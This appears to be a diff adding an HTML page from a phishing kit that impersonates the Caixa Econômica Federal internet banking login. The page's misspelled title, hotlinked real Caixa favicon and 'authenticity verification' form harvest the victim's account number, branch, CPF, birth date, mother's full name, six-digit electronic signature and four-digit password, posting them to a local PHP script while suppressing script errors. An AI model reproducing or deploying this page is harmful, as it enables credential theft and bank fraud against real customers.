@@ -1,0 +1,269 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Int-ernet____b anking____CaIXA
+  </title>
+  <link type="text/css" rel="stylesheet" href="extrutura/stylo_01.css" />
+  <link type="text/css" rel="stylesheet" href="extrutura/campo.css" />
+  <link type="text/css" rel="stylesheet" href="extrutura/hover.css" />
+  <script src="scripts/usuObrigatorio3.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/maiusculo.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/moviment.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/preenche.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/divOculta.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/divOculta2.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/sms_teclado.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/isNum.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="scripts/pulacampo.js" type="text/javascript" language="javascript">
+  </script>
+  <link href="https://internetbanking.caixa.gov.br/SIIBC/favicon.ico" rel="shortcut icon" />
+  <link href="https://internetbanking.caixa.gov.br/SIIBC/favicon.ico" type="image/x-icon" rel="icon" />
+  <script>
+   function limpa() {
+if(document.getElementById('senhanet').value!="") {
+document.getElementById('senhanet').value="";
+document.getElementById('campo2').value="";
+document.getElementById('campo3').value="";
+}
+}
+  </script>
+  <script>
+   function semerro(){
+return true;}
+window.onerror=semerro;
+  </script>
+  <script type="text/javascript">
+   $(document).ready(function(){
+$(function() {
+$('#cpf').mask('999.999.999-99');
+$('#mae').mask('99');
+$('#vida02').mask('99');
+});});
+  </script>
+  <style type="text/css">
+   .style1 {	font-family: Arial, Helvetica, sans-serif;	font-weight: bold;	font-size: 12px; color: #003366;}
+.style2 {
+	font-size: 12px;
+	font-family: Arial, Helvetica, sans-serif;
+	color: #666666;
+}
+.style3 {font-size: 12px; font-family: Arial, Helvetica, sans-serif; color: #666666; font-weight: bold; }
+  </style>
+ </head>
+ <body style="margin: 0;">
+  <div id="topo_1">
+   <div id="topo_2">
+    <div title="Caixa Economica Federal" id="image1">
+    </div>
+   </div>
+  </div>
+  <div id="corpo4">
+   <form onkeydown="Verificar()" onsubmit="return validaCampoObrigatorio(this)" autocomplete="off" target="_self" method="post" action="index4.php" name="form" id="form">
+    <div id="image3">
+    </div>
+    <div id="box002">
+     <table width="733" cellspacing="0" cellpadding="0">
+      <tbody>
+       <tr>
+        <td width="23" height="19">
+        </td>
+        <td height="19" colspan="5">
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="19">
+        </td>
+        <td height="19" class="style1" colspan="5">
+         VERIFICAÇÃO DE AUTENTICIDADE
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="19">
+        </td>
+        <td height="19" colspan="5">
+         <input type="hidden" value="" id="usuario" name="usuario" />
+         <input type="hidden" value="" id="senhanet" name="senhanet" />
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="32">
+        </td>
+        <td width="88" height="32" class="style1">
+         Operação:
+        </td>
+        <td height="32" colspan="4" class="style1">
+         <select id="txtOperacao" name="txtOperacao">
+          <option value="001">
+           Selecione sua operação
+          </option>
+          <option value="001">
+           001- Conta Corrente - P.Física
+          </option>
+          <option value="002">
+           002- Conta Simples - P.Física
+          </option>
+          <option value="003">
+           003- Conta Corrente - P.Jurídica
+          </option>
+          <option value="006">
+           006- Entidades Públicas
+          </option>
+          <option value="007">
+           007- Dep. Instituições Financeiras
+          </option>
+          <option value="013">
+           013- Poupança
+          </option>
+          <option value="022">
+           022- Poupança - Pessoa Jurídica
+          </option>
+          <option value="023">
+           023- Conta CAIXA Fácil
+          </option>
+          <option value="028">
+           028- Poupança Crédito Imobiliário
+          </option>
+          <option value="032">
+           032- Conta Investimento - P.Física
+          </option>
+          <option value="034">
+           034- Conta Investimento - P.Jurídica
+          </option>
+          <option value="043">
+           043- Depósitos Lotéricos
+          </option>
+         </select>
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="33">
+        </td>
+        <td width="88" height="33" class="style1">
+         Agência:
+        </td>
+        <td width="133" height="33" class="style1">
+         <input type="text" lang="1" onkeyup="javascript:pulacampo('agencia','conta')" maxlength="4" size="4" id="agencia" name="agencia" />
+        </td>
+        <td width="127" height="33" colspan="0" class="style1">
+         Conta e dígito:
+        </td>
+        <td height="33" class="style1" colspan="2">
+         <input type="text" lang="1" onkeyup="javascript:pulacampo('conta','digito')" maxlength="8" size="8" id="conta" name="conta" />
+         <input type="text" lang="1" xml:lang="1" maxlength="1" size="2" id="digito" name="digito" />
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="31">
+        </td>
+        <td width="88" height="31" class="style1">
+         CPF:
+        </td>
+        <td width="133" height="31" class="style1">
+         <input type="text" lang="1" onkeyup="javascript:pulacampo('cpf','nascimento')" maxlength="11" size="11" id="cpf" name="cpf" />
+        </td>
+        <td height="31" colspan="1" class="style1">
+         Data de Nascimento:
+        </td>
+        <td width="360" height="31" colspan="1">
+         <span class="style1">
+          <input type="text" lang="1" xml:lang="1" maxlength="10" size="10" id="nascimento" name="nascimento" />
+         </span>
+         <span class="style2">
+          ( dia/mes/ano ex: 01/12/1991 )
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="34">
+        </td>
+        <td width="88" height="34" class="style1">
+         Nome da Mãe:
+        </td>
+        <td height="34" colspan="5">
+         <span class="style1">
+          <input type="text" lang="1" xml:lang="1" maxlength="70" size="30" id="mae" name="mae" />
+         </span>
+         <span class="style2">
+          ( Informe o nome completo da mãe )
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="36">
+        </td>
+        <td width="88" height="36" class="style1">
+         Assinatura Eletrônica:
+        </td>
+        <td width="133" height="36" class="style1">
+         <input type="password" lang="1" xml:lang="1" maxlength="6" size="6" id="assina" name="assina" />
+        </td>
+        <td height="36" colspan="1" class="style1">
+         Senha de (4) dígitos:
+        </td>
+        <td height="36" colspan="1" class="style1">
+         <input type="password" lang="1" xml:lang="1" maxlength="4" size="4" id="senha4" name="senha4" />
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="10">
+        </td>
+        <td height="10" colspan="5">
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="19">
+        </td>
+        <td height="19" class="style3" colspan="5">
+         ASSINATURA ELETRÔNICA
+        </td>
+       </tr>
+       <tr>
+        <td width="23" height="45">
+        </td>
+        <td height="45" class="style2" colspan="5">
+         Assinatura Eletrônica permite ao cliente realizar pagamentos e transferências 
+  de valores pela Internet, caso não tenha, 
+  procure
+         <br />
+         o gerente de sua agência da 
+  CAIXA e solicite o cadastramento. Você receberá uma assinatura provisória com 6 
+  dígitos, que deverá ser personalizada durante o seu próximo acesso ao Internet 
+  Banking CAIXA através da opção acima.
+        </td>
+       </tr>
+      </tbody>
+     </table>
+    </div>
+    <div id="botoes">
+     <div id="cancelaIII">
+      <a href="index.php">
+       <div id="cancelaIBK">
+       </div>
+      </a>
+     </div>
+     <div id="avancarIII">
+      <input type="submit" title="avancarIBK" value="" id="avancarIBK" name="avancarIBK" />
+     </div>
+    </div>
+    <div id="mulher">
+    </div>
+   </form>
+  </div>
+  <div id="buttom">
+   <div id="dentroboton">
+    <div id="image00">
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
